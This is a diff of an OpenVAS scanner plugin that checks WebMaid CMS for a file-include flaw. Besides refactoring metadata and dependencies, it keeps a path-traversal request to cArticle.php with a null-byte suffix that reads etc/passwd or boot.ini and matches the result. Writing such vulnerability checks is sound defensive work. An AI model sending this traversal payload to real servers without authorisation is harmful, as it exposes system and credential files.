@@ -1,6 +1,5 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_webMAID_38993.nasl 14233 2019-03-16 13:32:43Z mmartin $
 #
 # WebMaid CMS Multiple Remote and Local File Include Vulnerabilities
 #
@@ -24,12 +23,11 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-
 if (description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.100559");
-  script_version("$Revision: 14233 $");
-  script_tag(name:"last_modification", value:"$Date: 2019-03-16 14:32:43 +0100 (Sat, 16 Mar 2019) $");
+  script_version("2019-05-14T08:13:05+0000");
+  script_tag(name:"last_modification", value:"2019-05-14 08:13:05 +0000 (Tue, 14 May 2019)");
   script_tag(name:"creation_date", value:"2010-03-29 12:55:36 +0200 (Mon, 29 Mar 2010)");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
@@ -45,21 +43,22 @@ if (description)
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
   script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
-  script_dependencies("gb_webMAID_detect.nasl");
+  script_dependencies("gb_webMAID_detect.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 80);
-  script_exclude_keys("Settings/disable_cgi_scanning");
+  script_mandatory_keys("webmaid/detected");
+
   script_tag(name:"summary", value:"WebMaid CMS is prone to multiple remote and local file-include
-vulnerabilities because it fails to sufficiently sanitize user-
-supplied input.
+  vulnerabilities because it fails to sufficiently sanitize user-supplied input.");
 
-An attacker may leverage these issues to execute arbitrary server-side
-script code that resides on an affected computer or in a remote
-location with the privileges of the webserver process. This may
-facilitate unauthorized access.
+  script_tag(name:"impact", value:"An attacker may leverage these issues to execute arbitrary server-side
+  script code that resides on an affected computer or in a remote location with the privileges of the
+  webserver process. This may facilitate unauthorized access.");
 
-WebMaid CMS 0.2-6 Beta is vulnerable. Other versions may also
-be affected.");
+  script_tag(name:"affected", value:"WebMaid CMS 0.2-6 Beta is vulnerable. Other versions may also
+  be affected.");
+
   script_tag(name:"solution_type", value:"WillNotFix");
+
   script_tag(name:"solution", value:"No known solution was made available for at least one year
   since the disclosure of this vulnerability. Likely none will be provided anymore.
   General solution options are to upgrade to a newer release, disable respective features,
@@ -71,25 +70,25 @@ be affected.");
 include("http_func.inc");
 include("http_keepalive.inc");
 include("version_func.inc");
+include("misc_func.inc");
+include("host_details.inc");
 
 port = get_http_port(default:80);
 
-if(!get_port_state(port))exit(0);
-if(!can_host_php(port:port))exit(0);
+if(!dir = get_dir_from_kb(port:port, app:"webmaid"))
+  exit(0);
 
-if(!dir = get_dir_from_kb(port:port, app:"webmaid"))exit(0);
+files = traversal_files();
 
-files = make_array("root:.*:0:[01]:","etc/passwd","\[boot loader\]","boot.ini");
+foreach pattern( keys( files ) ) {
 
-foreach file (keys(files)) {
+  file = files[pattern];
 
-  url = string(dir,"/cArticle.php?com=../../../../../../../../../../../../../../",files[file],"%00");
-
-  if(http_vuln_check(port:port, url:url,pattern:file)) {
-
-    security_message(port:port);
+  url = string(dir,"/cArticle.php?com=../../../../../../../../../../../../../../",file,"%00");
+  if(http_vuln_check(port:port, url:url, pattern:pattern)) {
+    report = report_vuln_url(port:port, url:url);
+    security_message(port:port, data:report);
     exit(0);
-
   }
 }
 
